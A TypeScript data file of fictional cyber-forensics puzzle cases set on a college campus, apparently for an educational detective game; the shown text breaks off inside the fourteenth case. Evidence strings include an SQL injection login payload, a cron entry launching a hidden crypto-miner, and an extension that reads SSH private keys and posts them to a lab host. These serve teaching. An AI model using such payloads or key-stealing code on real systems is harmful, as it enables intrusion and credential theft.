export interface CaseEvidence {
  type: string;
  title: string;
  detail: string;
}

export interface CaseSuspect {
  name: string;
  role: string;
  note: string;
}

export interface InvestigationCase {
  id: string;
  title: string;
  subtitle: string;
  category: string;
  duration: number;
  icon:
    | 'scan'
    | 'mail'
    | 'database'
    | 'fingerprint'
    | 'shield'
    | 'code'
    | 'globe'
    | 'footprints'
    | 'key'
    | 'sun';
  color: 'cyan' | 'emerald' | 'amber' | 'indigo' | 'violet' | 'rose';
  briefing: string;
  incident: string;
  evidence: CaseEvidence[];
  suspects: CaseSuspect[];
  timeline: string[];
  hints: string[];
}

export const cases: InvestigationCase[] = [
  {
    id: 'case-01',
    title: 'The Leaked Mid-Sem Question Paper',
    subtitle: 'Local IP Addresses & User-Agent Strings',
    category: 'Network & Access Forensics',
    duration: 5,
    icon: 'scan',
    color: 'cyan',
    briefing:
      'At 23:42, the Operating Systems mid-sem PDF was downloaded from the HOD portal using an active session token and leaked on Telegram.',
    incident: 'Server access logs, DHCP lease table, GitHub commit telemetry, and canteen CCTV.',
    evidence: [
      {
        type: 'SERVER LOG',
        title: 'Server Access Log',
        detail:
          '23:42:10 | GET /hod/os_midsem.pdf | IP: 192.168.14.88 | User-Agent: Windows NT 10.0 Chrome/128',
      },
      {
        type: 'NETWORK',
        title: 'DHCP Table',
        detail:
          'IP range 192.168.14.1–254 is strictly assigned to Campus & Hostel Wi-Fi. External networks show public IPs.',
      },
      {
        type: 'GIT LOG',
        title: 'GitHub Commit Log',
        detail: 'sneha-dev pushed verified commits at 23:41 using a MacBook (MacIntel).',
      },
      {
        type: 'CCTV',
        title: 'Canteen CCTV',
        detail: 'Rohan is seen sitting near the Wi-Fi router at 23:40 with his Windows laptop open.',
      },
    ],
    suspects: [
      {
        name: 'Aarav',
        role: 'Lab Assistant',
        note: 'I left the CS block at 18:00. Biometric logs confirm my exit.',
      },
      {
        name: 'Sneha',
        role: 'Tech Lead',
        note: 'I was pushing fest code from my hostel room on my MacBook all night.',
      },
      {
        name: 'Prof. Kulkarni',
        role: 'Visiting Faculty',
        note: 'I was at home on my personal broadband. I never use college Wi-Fi.',
      },
      {
        name: 'Rohan',
        role: 'Final Year Intern',
        note: 'I was just hanging out at the campus canteen with friends until midnight.',
      },
    ],
    timeline: [
      '23:40 — Rohan connects his Windows laptop to the canteen Wi-Fi access point.',
      '23:42 — os_midsem.pdf is downloaded from local IP 192.168.14.88.',
      '18:00 — Aarav punches out at the CS block biometric scanner and leaves campus.',
      '23:41 — Sneha pushes code to GitHub from her MacBook in the hostel.',
    ],
    hints: [
      'Check the IP address 192.168.14.88 — was the download from inside campus or an external home network?',
      'Match the Windows NT 10.0 User-Agent string with the suspects present on campus Wi-Fi at 23:42.',
    ],
  },
  {
    id: 'case-02',
    title: 'The Sabotaged Hackathon Repo',
    subtitle: 'Git Force Push & Exposed .env Secrets',
    category: 'Git & Secrets Forensics',
    duration: 5,
    icon: 'code',
    color: 'indigo',
    briefing:
      "Thirty minutes before final judging at a 24-hour hackathon, Team Alpha's main branch was wiped clean using git push --force.",
    incident: 'GitHub audit events, Discord chat export, volunteer desk logs, and repo clone telemetry.',
    evidence: [
      {
        type: 'GITHUB AUDIT',
        title: 'GitHub Audit Log',
        detail:
          '03:17:04 AM | Event: repo.force_push | Auth: Personal Access Token ("backend_deploy")',
      },
      {
        type: 'CHAT LOG',
        title: 'Discord Chat (01:10 AM)',
        detail:
          'Karthik: "Oops, accidentally pushed my .env file with my GitHub PAT inside! Will revoke tomorrow."',
      },
      {
        type: 'DESK LOG',
        title: 'Volunteer Desk Log',
        detail: '02:15 AM — Vikram borrowed a 65W USB-C laptop charger (Returned 03:45 AM).',
      },
      {
        type: 'REPO TELEMETRY',
        title: 'Repo Clone Log',
        detail: '03:12:40 AM — Repository cloned by user: vikram_codes',
      },
    ],
    suspects: [
      {
        name: 'Vikram',
        role: 'Rival Team Lead',
        note: 'My laptop died at 02:00 AM and I had no charger. Ask the volunteers!',
      },
      {
        name: 'Meera',
        role: 'Event Volunteer',
        note: 'I only manage the Wi-Fi router dashboard, not private GitHub repos.',
      },
      {
        name: 'Karthik',
        role: 'Frontend Dev',
        note: 'I was asleep under the table from 01:30 AM to 04:00 AM.',
      },
      {
        name: 'Ananya',
        role: 'Backend Dev',
        note: 'I was grabbing coffee at the cafeteria counter at 03:15 AM.',
      },
    ],
    timeline: [
      '03:12 AM — User vikram_codes clones the repository and extracts the exposed token.',
      '01:10 AM — Karthik accidentally commits his GitHub Personal Access Token inside the .env file.',
      '03:17 AM — A force push wipes the main branch using the stolen Personal Access Token.',
      '02:15 AM — Vikram borrows a 65W USB-C charger from the volunteer desk.',
    ],
    hints: [
      "Verify Vikram's claim about his dead laptop battery against the volunteer desk equipment log.",
      'Check who cloned the repository 5 minutes before the force push occurred.',
    ],
  },
  {
    id: 'case-03',
    title: 'The Phantom Attendance Proxy',
    subtitle: 'Social Engineering & OSINT',
    category: 'OSINT & Identity Security',
    duration: 5,
    icon: 'fingerprint',
    color: 'amber',
    briefing:
      'A student with 42% attendance jumped to 85% overnight in the ERP database via a legitimate faculty login—no SQL injection occurred.',
    incident: 'ERP authentication events, security question audit, public social posts, and browser fingerprint.',
    evidence: [
      {
        type: 'ERP AUTH',
        title: 'ERP Auth Log (prof_sharma@bec.edu)',
        detail: '16:05 Login Failed | 16:06 Login Failed | 16:07 Password Reset via Security Question',
      },
      {
        type: 'SECURITY LOG',
        title: 'Security Question Log',
        detail: 'Q: "Name of your first pet?" | A: "Bruno"',
      },
      {
        type: 'OSINT',
        title: "Prof. Sharma's Public Instagram",
        detail: 'Post from 2 weeks ago: "Happy birthday to my very first pet, Bruno!"',
      },
      {
        type: 'BROWSER',
        title: 'Browser Fingerprint',
        detail: 'The reset came from a browser with bookmarks: BEC_CR_Notices and Attendance_Upload.',
      },
    ],
    suspects: [
      {
        name: 'Aditya',
        role: 'Student (42% Att.)',
        note: "I don't know how ERP works! I was in the auditorium watching a fest movie.",
      },
      {
        name: 'Divya',
        role: 'ERP Student Intern',
        note: 'I only have read-only access to the test sandbox, not live attendance.',
      },
      {
        name: 'Rahul',
        role: 'Class Representative',
        note: 'I collected paper attendance sheets and handed them to the professor at 16:00.',
      },
      {
        name: 'Neha',
        role: 'Lab Partner',
        note: 'I was in the chemistry lab until 17:00. Check my lab sign-out sheet.',
      },
    ],
    timeline: [
      '16:07 — The attacker answers "Bruno" (found on Instagram) to reset the faculty password.',
      '16:09 — Aditya\'s attendance record is updated from 42% to 85% from a CR-bookmarked browser.',
      '16:00 — Rahul hands over the physical attendance sheets in the faculty room and notes Prof. Sharma\'s email ID.',
      '16:05 — Two failed password attempts are logged on prof_sharma@bec.edu.',
    ],
    hints: [
      'How did the attacker guess the security question answer without hacking the database?',
      "Look at the saved bookmarks on the attacker's browser fingerprint (BEC_CR_Notices).",
    ],
  },
  {
    id: 'case-04',
    title: 'The Lab-04 Wi-Fi Deauth Flood',
    subtitle: 'MAC Addresses & Signal Strength (RSSI)',
    category: 'Wireless & RF Forensics',
    duration: 5,
    icon: 'globe',
    color: 'rose',
    briefing:
      'During the final 15 minutes of an online coding qualifier in Lab-04, router AP-LAB04 crashed from a deauthentication flood.',
    incident: 'Wireless router syslog, DHCP lease table, and Lab-04 surveillance footage.',
    evidence: [
      {
        type: 'ROUTER SYSLOG',
        title: 'Router Syslog',
        detail:
          '21:14:05 | Deauth flood on Ch 6 | Source MAC: 98:E7:F4:22:10:8A | Signal: -32 dBm (Within 3m of router)',
      },
      {
        type: 'DHCP',
        title: 'DHCP Lease Table',
        detail:
          '192.168.10.14 (Siddharth-PC) | 192.168.10.22 (MAC 98:E7:F4:22:10:8A - Kali-Live-USB)',
      },
      {
        type: 'CCTV',
        title: 'Lab CCTV (21:13)',
        detail:
          'Tanmay is seated at Desk A1 directly below the wall router with a USB pendrive plugged into his laptop.',
      },
    ],
    suspects: [
      {
        name: 'Tanmay',
        role: '2nd Year CSE',
        note: 'I sat under the router, yes. I only booted Ubuntu from my USB because Windows froze.',
      },
      {
        name: 'Siddharth',
        role: '3rd Year ISE',
        note: 'I was at the back corner (12m away) closing background tasks in Terminal.',
      },
      {
        name: 'Pooja',
        role: '3rd Year CSE',
        note: 'I submitted my code at 21:10 and walked to the exit door to talk to the coordinator.',
      },
      {
        name: 'Harsha',
        role: '2nd Year ECE',
        note: 'I stepped outside into the corridor at 21:12 to take a phone call from home.',
      },
    ],
    timeline: [
      '21:12 — Tanmay boots Kali-Live-USB from his pendrive directly beneath AP-LAB04.',
      '21:15 — AP-LAB04 overloads and disconnects all 40 lab systems.',
      '21:10 — Pooja finishes her test and walks over to the exit door.',
      '21:14 — MAC 98:E7:F4:22:10:8A sends deauth packets at -32 dBm signal strength.',
    ],
    hints: [
      'A signal strength of -32 dBm means the attacker was within 3 meters of the wall router.',
      'Match MAC 98:E7:F4:22:10:8A in the DHCP table to the USB-booted OS on CCTV.',
    ],
  },
  {
    id: 'case-05',
    title: 'The Fake Internship Phish',
    subtitle: 'Typosquatting & Email Headers',
    category: 'Phishing & Email Forensics',
    duration: 5,
    icon: 'mail',
    color: 'emerald',
    briefing:
      'Ten students entered their ERP passwords into a fake Google Summer Internship portal shared on the batch WhatsApp group.',
    incident: 'SMTP headers, WHOIS domain registration, canteen Wi-Fi logs, and WhatsApp timestamps.',
    evidence: [
      {
        type: 'EMAIL HEADER',
        title: 'Email Header',
        detail: 'From: internship@bec-placemnts.in | X-Originating-IP: 103.21.58.190 | Time: 14:30 IST',
      },
      {
        type: 'WHOIS',
        title: 'WHOIS Lookup',
        detail:
          "Domain: bec-placemnts.in (Missing 'e') | Registered: Today 13:45 IST | Handle: dev_manoj99",
      },
      {
        type: 'WI-FI LOG',
        title: 'Canteen Wi-Fi Log',
        detail: '13:40 IST — User: manoj_k assigned IP 103.21.58.190 | Disconnected: 14:32 IST',
      },
      {
        type: 'CHAT LOG',
        title: 'WhatsApp Chat (14:35)',
        detail: 'Manoj: "Guys check mail fast! Only 50 slots left for Google intern registration!"',
      },
    ],
    suspects: [
      {
        name: 'Manoj',
        role: '3rd Year CSE',
        note: "I just forwarded the alert on WhatsApp so friends wouldn't miss out!",
      },
      {
        name: 'Kavya',
        role: '3rd Year CSE',
        note: 'I warned everyone in the group that the link was asking for ERP passwords.',
      },
      {
        name: 'Rakesh',
        role: '2nd Year Civil',
        note: "I clicked the link from my hostel room at 14:35. I don't know how to buy domains.",
      },
      {
        name: 'Deepak',
        role: '3rd Year Mech',
        note: 'My phone was locked outside the mechanical workshop from 13:00 to 16:00.',
      },
    ],
    timeline: [
      '14:30 — Phishing emails are sent out from 103.21.58.190.',
      '13:40 — manoj_k logs into Canteen Wi-Fi and receives public IP 103.21.58.190.',
      '14:35 — Manoj urges students on WhatsApp to quickly submit their credentials.',
      '13:45 — Typosquatted domain bec-placemnts.in is registered by dev_manoj99.',
    ],
    hints: [
      'Inspect the spelling of bec-placemnts.in and check the WHOIS registrant handle.',
      'Match X-Originating-IP: 103.21.58.190 with the Canteen Wi-Fi user session.',
    ],
  },
  {
    id: 'case-06',
    title: 'The Altered Fest Scoreboard',
    subtitle: 'API Keys & HTTP PUT Logs',
    category: 'API & Web Forensics',
    duration: 5,
    icon: 'code',
    color: 'violet',
    briefing:
      "During the Avon gaming tournament, Team Phoenix's score was manually overwritten from 120 to 950 points via an API call.",
    incident: 'API gateway request logs, public frontend commits, lab browser history, and sign-in register.',
    evidence: [
      {
        type: 'API GATEWAY',
        title: 'API Gateway Log',
        detail:
          '18:22:19 | PUT /api/v1/scores/phoenix {"pts": 950} | Key: ADMIN_KEY_77 | Tool: PostmanRuntime/7.39',
      },
      {
        type: 'GIT DIFF',
        title: 'Public GitHub Repo (Frontend)',
        detail:
          'Commit by arjun-ui at 15:00 accidentally hardcoded const KEY = "ADMIN_KEY_77" in app.js.',
      },
      {
        type: 'BROWSER',
        title: 'Lab PC Browser History (Desk 09)',
        detail: 'Visited github.com/avon-fest/scoreboard at 18:18, followed by Postman launch at 18:20.',
      },
      {
        type: 'REGISTER',
        title: 'Lab Entry Register',
        detail: 'Desk 09 was signed out to Kiran (Team Phoenix Captain) from 18:10 to 18:30.',
      },
    ],
    suspects: [
      {
        name: 'Arjun',
        role: 'Web Developer',
        note: 'I built the scoreboard UI, but I was on stage anchoring from 18:00 to 19:00.',
      },
      {
        name: 'Kiran',
        role: 'Phoenix Captain',
        note: "I only went to Desk 09 to check our PDF rulebook. I don't know backend coding.",
      },
      {
        name: 'Shreya',
        role: 'Scorekeeper',
        note: 'I update scores using the official React dashboard on Chrome, never Postman.',
      },
      {
        name: 'Varun',
        role: 'Rival Captain',
        note: "Why would I boost Team Phoenix's score? We were losing to them!",
      },
    ],
    timeline: [
      '18:10 — Kiran signs into Desk 09 in the computer lab.',
      '18:22 — A PUT request via Postman updates Team Phoenix\'s score to 950.',
      '15:00 — Arjun accidentally commits ADMIN_KEY_77 inside a public frontend JS file.',
      "18:18 — Desk 09's browser views the public GitHub repository containing the hardcoded key.",
    ],
    hints: [
      'Notice the request came from PostmanRuntime, not the normal Chrome dashboard.',
      'Check who was logged into Desk 09 when the GitHub repo and Postman were used.',
    ],
  },
  {
    id: 'case-07',
    title: 'The Library Server Crypto-Miner',
    subtitle: 'Linux Cron Jobs & SSH Logs',
    category: 'Linux & Endpoint Forensics',
    duration: 5,
    icon: 'database',
    color: 'cyan',
    briefing:
      'The digital library Ubuntu server slowed to a crawl because an unauthorized process xmrig_miner was consuming 99% CPU.',
    incident: 'Root crontab persistence, binary stat metadata, SSH auth logs, and Slack chat history.',
    evidence: [
      {
        type: 'CRONTAB',
        title: 'Crontab Entry (/var/spool/cron/crontabs/root)',
        detail: '*/5 * * * * /tmp/.hidden/xmrig_miner --wallet=48x9...',
      },
      {
        type: 'FILE STAT',
        title: 'File Stat (stat /tmp/.hidden/xmrig_miner)',
        detail: 'Birth: 2026-11-17 22:14:08 | Owner: dev_nikhil',
      },
      {
        type: 'SSH AUTH',
        title: 'Auth Log (/var/log/auth.log)',
        detail: '22:10:02 Accepted publickey for dev_nikhil from 172.16.5.44 (Hostel-Block-B)',
      },
      {
        type: 'CHAT LOG',
        title: 'Slack Message (22:15)',
        detail:
          'Nikhil: "Hey guys, why are the library server fans spinning like a jet engine right now?"',
      },
    ],
    suspects: [
      {
        name: 'Nikhil',
        role: 'Student Sysadmin',
        note: 'Someone must have stolen my SSH key! I only logged in to restart Apache.',
      },
      {
        name: 'Priya',
        role: 'Librarian',
        note: 'I only use the Windows barcode scanner PC at the front desk.',
      },
      {
        name: 'Sameer',
        role: 'Network Intern',
        note: 'My SSH account only has permissions in /var/www/html, not /tmp or root cron.',
      },
      {
        name: 'Tanya',
        role: '3rd Year CSE',
        note: 'I was in Hostel Block A all night; my IP starts with 172.16.2.x.',
      },
    ],
    timeline: [
      '22:14 — Binary /tmp/.hidden/xmrig_miner is created under owner dev_nikhil.',
      '22:15 — Nikhil messages Slack pretending to be surprised by the loud server fans.',
      '22:10 — dev_nikhil authenticates via SSH key from Hostel Block B (172.16.5.44).',
      '22:15 — A root cron job is scheduled to launch the miner every 5 minutes.',
    ],
    hints: [
      'Check the file owner and creation timestamp of /tmp/.hidden/xmrig_miner.',
      "Notice the SSH connection came from Hostel Block B—Nikhil's own hostel subnet.",
    ],
  },
  {
    id: 'case-08',
    title: 'The Deleted Project Presentation',
    subtitle: 'USB Serial Numbers & Windows Event Logs',
    category: 'Hardware & USB Forensics',
    duration: 5,
    icon: 'shield',
    color: 'indigo',
    briefing:
      "Minutes before the final year project viva, Team Vega's Final_Demo.pptx was permanently deleted (Shift+Delete) from the seminar hall podium PC.",
    incident: 'Windows Security Event 4663, USBDeview mount logs, property tag photos, and CCTV.',
    evidence: [
      {
        type: 'EVENT LOG',
        title: 'Windows Security Log (Event 4663)',
        detail: '10:04:12 AM | Object: D:\\Presentations\\Final_Demo.pptx | Access: DELETE | User: Seminar_Guest',
      },
      {
        type: 'USB HISTORY',
        title: 'USB Device History (USBDeview)',
        detail:
          '10:02:50 AM — SanDisk Cruzer Blade (Serial: 4C5300012908) connected | Disconnected: 10:05:10 AM',
      },
      {
        type: 'PROPERTY TAG',
        title: 'Lost & Found / ID Tag Photo',
        detail:
          'A SanDisk Cruzer Blade with serial 4C5300012908 is attached to a lanyard reading "Rohan M. — Team Orion".',
      },
      {
        type: 'CCTV',
        title: 'Seminar Hall CCTV',
        detail:
          'At 10:03 AM, Rohan walks up to the podium claiming he needs to test if his slides display properly on the projector.',
      },
    ],
    suspects: [
      {
        name: 'Rohan M.',
        role: 'Team Orion Lead',
        note: 'I only plugged my pendrive in to copy my own slides onto the desktop!',
      },
      {
        name: 'Snehal',
        role: 'AV Volunteer',
        note: 'I was at the back of the hall adjusting the microphone mixer at 10:04 AM.',
      },
      {
        name: 'Aditi',
        role: 'Team Vega Member',
        note: "Why would I delete my own team's presentation right before our turn?",
      },
      {
        name: 'Prof. Desai',
        role: 'Panel Judge',
        note: 'I entered the seminar hall at 10:10 AM when the viva session began.',
      },
    ],
    timeline: [
      "10:04:12 — Final_Demo.pptx is deleted while Rohan's USB drive is still mounted.",
      '10:10:00 — Prof. Desai enters the hall and starts the viva presentations.',
      '10:02:50 — Rohan plugs his SanDisk pendrive (4C5300012908) into the podium PC.',
      '10:05:10 — Rohan ejects his USB drive and returns to his seat.',
    ],
    hints: [
      'Compare the timestamp of the file deletion (10:04:12) with the USB connection window.',
      'Match USB serial number 4C5300012908 to its owner.',
    ],
  },
  {
    id: 'case-09',
    title: 'The Dormitory Smart Lock Bypass',
    subtitle: 'RFID Card UID & Replay Logs',
    category: 'Physical & RFID Security',
    duration: 5,
    icon: 'key',
    color: 'amber',
    briefing:
      'The electronics hardware lab was unlocked at 02:30 AM and a Raspberry Pi 5 kit went missing. The smart lock opened without forced entry.',
    incident: 'Smart lock access controller logs, gate biometrics, hardware purchase receipts, and CCTV.',
    evidence: [
      {
        type: 'ACCESS LOG',
        title: 'Smart Lock Access Log',
        detail: '02:31:15 AM | Door: HW-LAB | Status: UNLOCKED | Card UID: A4-91-0C-77 (Assigned to: Prof. Nair)',
      },
      {
        type: 'BIOMETRIC',
        title: 'Campus Main Gate Biometric Log',
        detail: 'Prof. Nair exited campus at 17:45 PM yesterday; has not re-entered.',
      },
      {
        type: 'RECEIPT',
        title: 'Flipper Zero / RFID Cloner Purchase Receipt (Email)',
        detail: 'Sent to sid_ece@bec.edu (Siddharth) last week.',
      },
      {
        type: 'CCTV',
        title: 'Hostel Corridor CCTV (02:25 AM)',
        detail: 'Siddharth seen walking toward the electronics block wearing a black hoodie.',
      },
    ],
    suspects: [
      {
        name: 'Prof. Nair',
        role: 'Lab In-Charge',
        note: 'My ID card has been in my wallet at home all night!',
      },
      {
        name: 'Siddharth',
        role: '3rd Year ECE',
        note: 'I was just going to the vending machine at 02:25 AM because I was hungry.',
      },
      {
        name: 'Nandini',
        role: 'Lab Peon',
        note: 'I lock the manual deadbolt at 18:00; only faculty RFID cards can open the electronic latch.',
      },
      {
        name: 'Akash',
        role: '2nd Year Mech',
        note: "I don't even know what a Raspberry Pi is, and I live in the off-campus PG.",
      },
    ],
    timeline: [
      '02:25 AM — Siddharth walks toward the electronics block on hostel CCTV.',
      '02:34 AM — The Raspberry Pi 5 kit is removed from the lab shelf.',
      '17:45 PM — Prof. Nair leaves campus with his original physical RFID card.',
      '02:31 AM — A cloned RFID signal matching UID A4-91-0C-77 unlocks the hardware lab.',
    ],
    hints: [
      'Since Prof. Nair was off-campus, the attacker must have cloned his RFID card UID.',
      'Check who purchased an RFID cloning tool and was spotted on CCTV at 02:25 AM.',
    ],
  },
  {
    id: 'case-10',
    title: 'The Spoofed Dean Announcement',
    subtitle: 'SPF/DKIM Email Authentication',
    category: 'Phishing & Email Forensics',
    duration: 5,
    icon: 'mail',
    color: 'rose',
    briefing:
      "A fake email claiming tomorrow's exams were postponed due to heavy rain caused chaos among 800 students.",
    incident: 'Raw email authentication headers, SMTP relay verification logs, council directory, and Telegram poll.',
    evidence: [
      {
        type: 'EMAIL SOURCE',
        title: 'Raw Email Source',
        detail: 'From: dean@bec.edu | Return-Path: mailer@free-smtp-relay.xyz | SPF: FAIL | DKIM: NONE',
      },
      {
        type: 'RELAY LOG',
        title: 'SMTP Relay Log',
        detail: 'Account: "prankster_01" | Recovery Phone Ending: **89 | Sent at: 20:15 IST',
      },
      {
        type: 'DIRECTORY',
        title: 'Student Council Directory',
        detail: 'Phone numbers ending in: Aarav (**12), Bhavna (**45), Chetan (**89), Divya (**30).',
      },
      {
        type: 'TELEGRAM',
        title: 'Telegram Group Poll (20:16 IST)',
        detail: 'Chetan immediately posts: "OMG guys check email! Exam cancelled!! Party tonight!"',
      },
    ],
    suspects: [
      {
        name: 'Aarav',
        role: 'General Secretary',
        note: 'Official college emails always pass SPF and DKIM. This was spoofed externally.',
      },
      {
        name: 'Bhavna',
        role: 'Cultural Sec',
        note: 'I was in dance rehearsal from 19:00 to 21:30 without my phone.',
      },
      {
        name: 'Chetan',
        role: 'Sports Rep',
        note: 'I just got the email like everyone else and celebrated in the Telegram group!',
      },
      {
        name: 'Divya',
        role: 'IT Admin',
        note: 'Our official mail server is Google Workspace; we never use free-smtp-relay.xyz.',
      },
    ],
    timeline: [
      '20:15 — Spoofed email forging dean@bec.edu is sent (failing SPF/DKIM checks).',
      '20:30 — IT Admin Divya issues an official notice warning students about the spoofed header.',
      '20:10 — Account prankster_01 is verified on free-smtp-relay.xyz using a phone ending in **89.',
      '20:16 — Chetan immediately announces the fake holiday in the student Telegram group.',
    ],
    hints: [
      'Look at the Return-Path and recovery phone digits (**89) on the SMTP relay account.',
      'Match the phone digits **89 against the Student Council Directory.',
    ],
  },
  {
    id: 'case-11',
    title: 'The Leaked API Payment Secret',
    subtitle: 'Git Commit History (git log -p)',
    category: 'Git & Secrets Forensics',
    duration: 5,
    icon: 'key',
    color: 'emerald',
    briefing:
      "₹15,000 worth of fest merch vouchers were redeemed using a Razorpay test/live secret key that someone extracted from the fest's open-source repo.",
    incident: 'Git commit diff history, clone traffic statistics, and payment voucher redemption logs.',
    evidence: [
      {
        type: 'GIT DIFF',
        title: 'Git Commit Diff (Commit a81f9c)',
        detail:
          'Author rohit-dev added RAZORPAY_SECRET="rzp_live_99812x", then deleted it in commit b92e1d ("removed key").',
      },
      {
        type: 'CLONE STATS',
        title: 'GitHub Traffic Clone Stats',
        detail: 'Only one external user cloned the full repository history after commit b92e1d: user: tarun_sec.',
      },
      {
        type: 'PAYMENT LOG',
        title: 'Voucher Redemption Log',
        detail: '15 vouchers redeemed to email: tarun.gamer99@gmail.com | IP: 49.37.112.8',
      },
    ],
    suspects: [
      {
        name: 'Rohit',
        role: 'Backend Lead',
        note: 'I accidentally pushed the key, realized 2 minutes later, and deleted it in the next commit!',
      },
      {
        name: 'Tarun',
        role: '2nd Year CSE',
        note: "I cloned the repo just to learn React! The key wasn't even in the latest files.",
      },
      {
        name: 'Megha',
        role: 'Finance Head',
        note: "I don't even have a GitHub account; I manage the Excel sheet.",
      },
      {
        name: 'Suresh',
        role: 'Merch Vendor',
        note: "I only scan QR codes at the stall; I don't generate vouchers.",
      },
    ],
    timeline: [
      '11:02 — Rohit deletes the line in commit b92e1d without rotating the key.',
      '12:10 — Fifteen merch vouchers are generated and sent to tarun.gamer99@gmail.com.',
      '11:00 — Rohit commits RAZORPAY_SECRET into the public repo in commit a81f9c.',
      '11:45 — tarun_sec clones the repo and inspects git log -p to recover the deleted secret.',
    ],
    hints: [
      'Deleting a secret in a new Git commit does not erase it from previous commit history.',
      'Check who cloned the repository and redeemed the vouchers to their Gmail address.',
    ],
  },
  {
    id: 'case-12',
    title: 'The Malicious VS Code Extension',
    subtitle: 'Supply Chain & Outbound DNS/HTTP',
    category: 'Supply Chain & Endpoint Forensics',
    duration: 5,
    icon: 'code',
    color: 'violet',
    briefing:
      'Every student who installed a custom "Avon Dark Theme" VS Code extension from a USB drive had their ~/.ssh/id_rsa private keys uploaded to a pastebin.',
    incident: 'Extension source inspection, lab DHCP table, and Discord distribution message.',
    evidence: [
      {
        type: 'SOURCE CODE',
        title: 'Extension package.json & extension.js',
        detail:
          "Contains fs.readFileSync(os.homedir() + '/.ssh/id_rsa') posting to http://192.168.50.99:8080/collect.",
      },
      {
        type: 'DHCP',
        title: 'Lab DHCP Table',
        detail: '192.168.50.99 is assigned to Host: Harsh-kali-box (MAC: 00:0C:29:88:1A:4F).',
      },
      {
        type: 'CHAT LOG',
        title: 'Discord Message',
        detail:
          'Harsh: "Hey guys, I made a sick custom VS Code theme for Avon! Grab the .vsix file from my pendrive!"',
      },
    ],
    suspects: [
      {
        name: 'Harsh',
        role: '3rd Year CSE',
        note: 'I only wrote CSS color codes for the theme! Someone must have modified my .vsix file.',
      },
      {
        name: 'Isha',
        role: 'Workshop Mentor',
        note: 'I told everyone to only install extensions from the official Microsoft Marketplace.',
      },
      {
        name: 'Pranav',
        role: '1st Year ECE',
        note: "I installed Harsh's theme and my SSH key got stolen too!",
      },
      {
        name: 'Gautam',
        role: 'Lab Assistant',
        note: "I don't use VS Code; I only maintain the projector and AC.",
      },
    ],
    timeline: [
      '14:15 — Harsh distributes the trojanized .vsix theme file via USB pendrive.',
      '14:26 — Victim SSH keys are transmitted to 192.168.50.99:8080/collect.',
      '14:00 — Harsh starts a local HTTP listener on port 8080 at IP 192.168.50.99.',
      '14:25 — Pranav installs the extension, triggering extension.js to read ~/.ssh/id_rsa.',
    ],
    hints: [
      'Look at the destination IP address hardcoded inside extension.js (192.168.50.99).',
      'Check the DHCP table to see whose machine owns IP 192.168.50.99.',
    ],
  },
  {
    id: 'case-13',
    title: 'The SQLi Canteen Coupon Bug',
    subtitle: 'SQL Injection Logs',
    category: 'API & Web Forensics',
    duration: 5,
    icon: 'database',
    color: 'cyan',
    briefing:
      'Someone bypassed the login screen of the fest food-coupon portal without a valid OTP and generated 50 free burger coupons.',
    incident: 'Web application access logs, issued session cookies, counter redemption logs, and Wi-Fi device registry.',
    evidence: [
      {
        type: 'WEB LOG',
        title: 'Web App Error & Access Log',
        detail: 'POST /login | Payload: {"roll_no": "\' OR 1=1 --", "otp": "0000"} | Status: 200 OK',
      },
      {
        type: 'SESSION',
        title: 'Session Cookie Issued',
        detail: 'session_id=991a2b | User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 7)',
      },
      {
        type: 'CANTEEN LOG',
        title: 'Canteen Redemption Log',
        detail: '50 coupons redeemed at Counter 2 by device with session_id=991a2b',
      },
      {
        type: 'WI-FI REGISTRY',
        title: 'Device Registry (Campus Wi-Fi)',
        detail: 'Only one Pixel 7 is registered on campus Wi-Fi: Owner Nitin Verma.',
      },
    ],
    suspects: [
      {
        name: 'Nitin Verma',
        role: '3rd Year ISE',
        note: 'I only redeemed 1 burger coupon on my Pixel 7! Someone else hacked the site.',
      },
      {
        name: 'Riya',
        role: 'Portal Developer',
        note: 'I forgot to use parameterized queries on the login form, my bad, I use an iPhone 15.',
      },
      {
        name: 'Kabir',
        role: 'Canteen Cashier',
        note: "I just scanned the QR codes presented on the student's phone at Counter 2.",
      },
      {
        name: 'Omkar',
        role: '2nd Year Civil',
        note: "I use a Redmi Note 11 and didn't even go to the canteen today.",
      },
    ],
    timeline: [
      "13:10 — Payload ' OR 1=1 -- bypasses OTP authentication and issues session_id=991a2b.",
      '13:20 — The coupons are scanned and redeemed at Canteen Counter 2.',
      '13:05 — Nitin connects his Pixel 7 to the campus Wi-Fi network.',
      '13:12 — Fifty free burger coupons are generated under session_id=991a2b.',
    ],
    hints: [
      'Look at the User-Agent string tied to session_id=991a2b (Android 14; Pixel 7).',
      'Match the Pixel 7 device against the campus Wi-Fi registry.',
    ],
  },
  {
    id: 'case-14',
    title: 'The Rigged Quiz Timer',
    subtitle: 'Client-Side Tampering & DevTools',
    category: 'API & Web Forensics',
    duration: 5,
    icon: 'scan',
    color: 'indigo',
    briefing:
      'In an online MCQ quiz with a strict 10-minute timer, one participant took 45 minutes to look up every answer on Google and still submitted with "02:10 remaining".',
    incident: 'Quiz server timestamps, frontend submission script, roll submission record, and console history.',
    evidence: [
      {
        type: 'SERVER LOG',
        title: 'Quiz Server Log',
        detail: 'Quiz Started: 15:00:00 | Quiz Submitted: 15:45:12 | Client-Reported Time Left: 02:10',
      },
      {
        type: 'FRONTEND CODE',
        title: 'Frontend JS Code (quiz.js)',
        detail: "fetch('/submit', { body: JSON.stringify({ answers, timeLeft: window.timerSeconds }) })",
      },
      {
        type: 'SUBMISSION',
        title: 'Submission Details',
        detail: 'Roll No: 2BA23CS041 (Name: Sahil K.) | Score: 30/30',
      },
      {
        type: 'CONSOLE',
        title: 'Browser Console History (Lab PC 12)',
        detail: 'window.timerSeconds = 130; executed at 15:45:05.',
      },
    ],
    suspects: [
      {
        name: 'Sahil K.',
        role: '2nd Year CSE',
        note: 'My browser clock must have glitched! I finished in 8 minutes honestly.',
      },
      {
        name: 'Ankita',
        role: 'Quiz Coordinator',
        note: 'I accidentally trusted the frontend window.timerSeconds variable instead of checking server timestamps.',
      },
      {
        name: 'Devansh',
        role: '3rd Year ECE',
        note: 'I submitted at 15:09:30 and scored 24/30.',
      },
      {
        name: 'Lakshmi',
        role: 'Lab Invigilator',
        note: 'I noticed Sahil had Chrome DevTools open on Lab PC 12 near the end.',
      },
    ],
    timeline: [
      '15:10:00 — The actual 10-minute window expires, but Sahil pauses/ignores the client timer while searching answers.',
      '15:45:12 — The server records a 45-minute total duration alongside a spoofed "02:10 remaining".',
      '15:00:00 — Sahil K. starts the 10-minute MCQ quiz on Lab PC 12.',
      '15:45:05 — Sahil runs window.timerSeconds = 130 in Chrome DevTools Console.',
    ],
    hints: [
